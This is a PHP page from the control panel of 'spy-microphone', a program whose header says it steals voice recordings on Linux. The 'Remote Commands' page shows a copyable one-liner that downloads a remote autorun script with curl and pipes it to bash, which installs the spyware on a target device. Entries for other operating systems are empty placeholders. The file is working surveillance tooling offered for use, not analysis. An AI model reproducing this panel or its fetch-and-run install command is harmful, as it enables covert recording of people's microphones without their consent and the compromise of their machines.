<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

else
{
unset($_SESSION["hard_disk_id"]);
}


?>



﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title> Spy microphone Controller </title>

    <link rel="Shortcut Icon" type="image/ico" href="favicon.ico">


	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />



<meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/v4-shims.css">



</head>

<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top" role="navigation" style="margin-bottom:0; background-color:#4d4d4d;">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="dashboard.php" style="background-color:#c90000;"> <font color='white'> Spymic </font> </a>  
            </div>
 
      <div style="color: white; padding: 15px 50px 5px 50px;float: right; font-size: 16px;"> 
             <?php echo date("d-m-Y H:i"); ?> &nbsp; 
             <a href="logout.php" class="btn btn-danger square-btn-adjust">
              Logout <i class="fa fa-sign-out"></i>
             </a>  
           </div>

        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation" style="background-color:#202020;">
            <div class="sidebar-collapse"> 
                <ul class="nav" id="main-menu">
				<li class="text-center" style="background-color:#202020;">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                   <li>
              <a href="dashboard.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard </a>
                    </li>
                     <li>
                        <a  href="ui_elements.php"><i class="fa fa-desktop fa-3x"></i> UI Elements</a>
                    </li>
                   
      <li>
         <a  href="records_microphone.php"><i class="fa fa-microphone fa-3x"></i> Records Microphone</a>
      </li>
                   			
			                   
                    <li>
          <a href="#"><i class="fa fa-sitemap fa-3x"></i> Multi Tasking <span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link<span class="fa arrow"></span></a>
                                <ul class="nav nav-third-level">
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>

                                </ul>
                               
                            </li>
                        </ul>
                      </li>  

                  <li>
             <a class="active-menu" href="remote_commands.php">
           <i class="fa fa-terminal fa-3x"></i> Remote Commands </a>
                    </li>	

                    <li>
                        <a  href="settings.php"><i class="fa fa-cogs fa-3x"></i> Settings </a>
                    </li>

                        </ul>
                      </li>  
                 
                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">
                     <h2>  </h2> 
                       
                    </div>
                </div>

 
         
  <div class='container-fluid'>
    <div class='panel panel-info'>
      <div class='panel-heading'>
        <div class='row'>
          <div class='col-xs-12 col-sm-12 col-md-8'>
            <h2 class='text-center pull-left' style='padding-left: 30px;color:red;'>  
            <i class='fa fa-terminal' style='color:red;'> </i> Remote commands for spymic </h2>
          </div>
          <div class='col-xs-9 col-sm-9 col-md-9'>
            <div class='col-xs-12 col-sm-12 col-md-12'>
              <div class='col-xs-12 col-md-4'>             
              </div>
            </div>
          </div>
        </div>
      </div> 

      <div class='panel-body table-responsive'>
        <table class='table table-hover'>
          <thead>
            <tr>
              <th class='text-center'> Device <i class='fa fa-desktop'> </i></th>
              <th class='text-center'> 
                 Operating System 
                 <i class='fa fa-windows'> </i>
                 <i class='fa fa-apple'> </i>
                 <i class='fa fa-linux'> </i>
               </th>
               <th class='text-center'> Command <i class='fa fa-terminal'> </i> </th>
            </tr>
          </thead>


         <tbody>

          <tr>
             
           <td class='text-center'> <i class='fa fa-desktop fa-2x'> </i> </td>
           <td class='text-center'> <i class='fa fa-linux'> </i>  Linux  </td>
           <td class='text-center'> 

               <?php
             $linux = "bash <(curl -s https://raw.githubusercontent.com/makdosx/spy-microphone/master/shell/autorun.sh)";  
             $command_linux =  wordwrap($linux,50, "<br>", true); 
             echo"<button type='button' class='btn btn-info btn-md' data-toggle='modal' data-target='#myModal1'> View <i class='fa fa-eye'> </i> </button>";


  echo"
  <div class='modal fade' id='myModal1' role='dialog'>
    <div class='modal-dialog modal-lg'>
      <div class='modal-content'>
        <div class='modal-header'>
          <button type='button' class='close' data-dismiss='modal'>&times;</button>
          <h4 class='modal-title'> <i class='fa fa-linux'> </i> Linux command </h4>
        </div>
        <div class='modal-body'>
          <p> 
            <i class='fa fa-linux fa-3x'> </i>
            <i class='fab fa-ubuntu fa-3x'> </i>
            <i class='fab fa-suse fa-3x'> </i>
            <i class='fab fa-redhat fa-3x'> </i>
            <i class='fab fa-fedora fa-3x'> </i>
            <i class='fab fa-centos fa-3x'> </i>

            <br><br> 

             <input value='$command_linux' id='myInput1' hidden> $command_linux <br><br> 
             <button onclick='myFunction1()'> Copy command </button>

            <script>
              function myFunction1() {
              var copyText = document.getElementById('myInput1');
              copyText.select();
              copyText.setSelectionRange(0, 99999)
              document.execCommand('copy');
              alert('Copied the text: ' + copyText.value);
              }
            </script>

         </p>
        </div>
        <div class='modal-footer'>
          <button type='button' class='btn btn-default' data-dismiss='modal'>Close</button>
        </div>
      </div>
    </div>
  </div>
</div>";

           ?>

           </td>
           </tr>


         <tr>
        <td class='text-center'> <i class='fa fa-desktop fa-2x'> </i> </td>
           <td class='text-center'> <i class='fa fa-windows'> </i> Windows </td>
           <td class='text-center'>  

          <?php
             $windows = "";  
             $command_windows =  wordwrap($windows,50, "<br>", true); 
             echo"<button type='button' class='btn btn-info btn-md' data-toggle='modal' data-target='#myModal2'> View <i class='fa fa-eye'> </i> </button>";


  echo"
  <div class='modal fade' id='myModal2' role='dialog'>
    <div class='modal-dialog modal-lg'>
      <div class='modal-content'>
        <div class='modal-header'>
          <button type='button' class='close' data-dismiss='modal'>&times;</button>
          <h4 class='modal-title'> <i class='fa fa-windows'> </i> Windows command </h4>
        </div>
        <div class='modal-body'>
          <p> <i class='fa fa-windows fa-4x'> </i> <br><br> $command_windows 
         </p>
        </div>
        <div class='modal-footer'>
          <button type='button' class='btn btn-default' data-dismiss='modal'>Close</button>
        </div>
      </div>
    </div>
  </div>
</div>";

?>
            </td>
         </tr>


      <tr>
        <td class='text-center'> <i class='fa fa-desktop fa-2x'> </i> </td>
           <td class='text-center'> <i class='fa fa-apple'> </i> iMac </td>
           <td class='text-center'>  

          
          <?php
             $mac = "";  
             $command_mac =  wordwrap($mac,50, "<br>", true); 
             echo"<button type='button' class='btn btn-info btn-md' data-toggle='modal' data-target='#myModal3'> View <i class='fa fa-eye'> </i> </button>";


  echo"
  <div class='modal fade' id='myModal3' role='dialog'>
    <div class='modal-dialog modal-lg'>
      <div class='modal-content'>
        <div class='modal-header'>
          <button type='button' class='close' data-dismiss='modal'>&times;</button>
          <h4 class='modal-title'> <i class='fa fa-apple'> </i> iMac command </h4>
        </div>
        <div class='modal-body'>
          <p> <i class='fa fa-apple fa-4x'> </i> <br><br> $command_mac 
         </p>
        </div>
        <div class='modal-footer'>
          <button type='button' class='btn btn-default' data-dismiss='modal'>Close</button>
        </div>
      </div>
    </div>
  </div>
</div>";

?>

            </td>
         </tr>


       <tr>
        <td class='text-center'> <i class='fa fa-laptop-code fa-2x'> </i> </td>
           <td class='text-center'> <i class='fa fa-laptop-code'> </i> Macbook </td>
           <td class='text-center'>  

       <?php
             $macbooc = "";  
             $command_macbook =  wordwrap($macbook,50, "<br>", true); 
             echo"<button type='button' class='btn btn-info btn-md' data-toggle='modal' data-target='#myModal4'> View <i class='fa fa-eye'> </i> </button>";


  echo"
  <div class='modal fade' id='myModal4' role='dialog'>
    <div class='modal-dialog modal-lg'>
      <div class='modal-content'>
        <div class='modal-header'>
          <button type='button' class='close' data-dismiss='modal'>&times;</button>
          <h4 class='modal-title'> <i class='fa fa-laptop-code'> </i> Macbook command </h4>
        </div>
        <div class='modal-body'>
          <p> <i class='fa fa-laptop-code fa-4x'> </i> <br><br> $command_macbook 
         </p>
        </div>
        <div class='modal-footer'>
          <button type='button' class='btn btn-default' data-dismiss='modal'>Close</button>
        </div>
      </div>
    </div>
  </div>
</div>";

?>

            </td>
         </tr>


      <tr>
        <td class='text-center'> <i class='fa fa-mobile fa-2x'> </i> </td>
           <td class='text-center'> <i class="fab fa-app-store-ios"></i> </i> iPhone </td>
           <td class='text-center'>  
          
         <?php
             $iphone = "";  
             $command_iphone =  wordwrap($mac,50, "<br>", true); 
             //echo $command_linux; 
             echo"<button type='button' class='btn btn-info btn-md' data-toggle='modal' data-target='#myModal5'> View <i class='fa fa-eye'> </i> </button>";


  echo"
  <div class='modal fade' id='myModal5' role='dialog'>
    <div class='modal-dialog modal-lg'>
      <div class='modal-content'>
        <div class='modal-header'>
          <button type='button' class='close' data-dismiss='modal'>&times;</button>
          <h4 class='modal-title'> <i class='fab fa-app-store-ios'> </i> iPhone command </h4>
        </div>
        <div class='modal-body'>
          <p> <i class='fab fa-app-store-ios fa-4x'> </i> <br><br> $command_iphone 
         </p>
        </div>
        <div class='modal-footer'>
          <button type='button' class='btn btn-default' data-dismiss='modal'>Close</button>
        </div>
      </div>
    </div>
  </div>
</div>";

?>

            </td>
         </tr>



      <tr>
        <td class='text-center'> <i class='fa fa-mobile fa-2x'> </i> </td>
           <td class='text-center'> <i class="fa fa-robot"></i> </i> Android </td>
           <td class='text-center'>  

          <?php
             $android = "";  
             $command_android =  wordwrap($android,50, "<br>", true); 
             //echo $command_linux; 
             echo"<button type='button' class='btn btn-info btn-md' data-toggle='modal' data-target='#myModal6'> View <i class='fa fa-eye'> </i> </button>";


  echo"
  <div class='modal fade' id='myModal6' role='dialog'>
    <div class='modal-dialog modal-lg'>
      <div class='modal-content'>
        <div class='modal-header'>
          <button type='button' class='close' data-dismiss='modal'>&times;</button>
          <h4 class='modal-title'> <i class='fa fa-robot'> </i> Android command </h4>
        </div>
        <div class='modal-body'>
          <p> <i class='fa fa-robot fa-3x'> </i> <br><br> $command_android 
         </p>
        </div>
        <div class='modal-footer'>
          <button type='button' class='btn btn-default' data-dismiss='modal'>Close</button>
        </div>
      </div>
    </div>
  </div>
</div>";

?>

            </td>
         </tr>


         </tbody>
        </table>
      </div>
             
               
    </div>
             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
        </div>
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
    
   
</body>
</html>
